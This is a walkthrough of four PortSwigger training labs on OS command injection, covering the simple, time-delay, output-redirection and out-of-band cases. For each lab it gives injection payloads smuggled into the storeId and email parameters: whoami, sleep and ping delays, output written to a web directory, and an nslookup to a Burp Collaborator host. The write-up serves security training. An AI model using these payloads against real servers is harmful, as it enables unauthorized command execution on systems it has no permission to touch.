<!-- omit in toc -->
# OS command injection

<!-- omit in toc -->
## Table of Contents

- [OS command injection, simple case](#os-command-injection-simple-case)
- [Blind OS command injection with time delays](#blind-os-command-injection-with-time-delays)
- [Blind OS command injection with output redirection](#blind-os-command-injection-with-output-redirection)
- [Blind OS command injection with out-of-band interaction](#blind-os-command-injection-with-out-of-band-interaction)

## OS command injection, simple case
Reference: https://portswigger.net/web-security/os-command-injection/lab-simple

<!-- omit in toc -->
### Quick Solution
Intercept the **check stock** request and modify the ``storeId`` parameter to:
```
%26whoami%26
```
The payload provided by PortSwigger is a little bit different, but the result is the same.

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify a request that checks the stock level.
2. Modify the ``storeID`` parameter, giving it the value ``1|whoami``.
3. Observe that the response contains the name of the current user.

## Blind OS command injection with time delays
Reference: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

<!-- omit in toc -->
### Quick Solution
As with the previous lab I used a different payload to solve the lab. I tried the following payload on every parameter of the **Submit feedback** request (until it worked with the ``email`` parameter):
```
%26sleep%2010%26
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the ``email`` parameter, changing it to:
```
email=x||ping+-c+10+127.0.0.1||
```
3. Observe that the response takes 10 seconds to return.

## Blind OS command injection with output redirection
Reference: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

<!-- omit in toc -->
### Quick Solution
As with the previous lab I used a different payload to solve the lab. I tried the following payload on every parameter of the **Submit feedback** request (until it worked with the ``email`` parameter):
```
%26whoami>whoami.txt%26
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the ``email`` parameter, changing it to:
```
email=||whoami>/var/www/images/output.txt||
```
3. Now use Burp Suite to intercept and modify the request that loads an image of a product.
4. Modify the ``filename`` parameter, changing the value to the name of the file you specified for the output of the injected command:
```
filename=output.txt
```
5. Observe that the response contains the output from the injected command.

## Blind OS command injection with out-of-band interaction
Reference: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

<!-- omit in toc -->
### Quick Solution
As with the previous lab I used a different payload to solve the lab. I tried the following payload on every parameter of the **Submit feedback** request (until it worked with the ``email`` parameter):
```
%26nslookup%20your-burp-collaborator%26
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the ``email`` parameter, changing it to:
```
email=x||nslookup+x.burpcollaborator.net||
```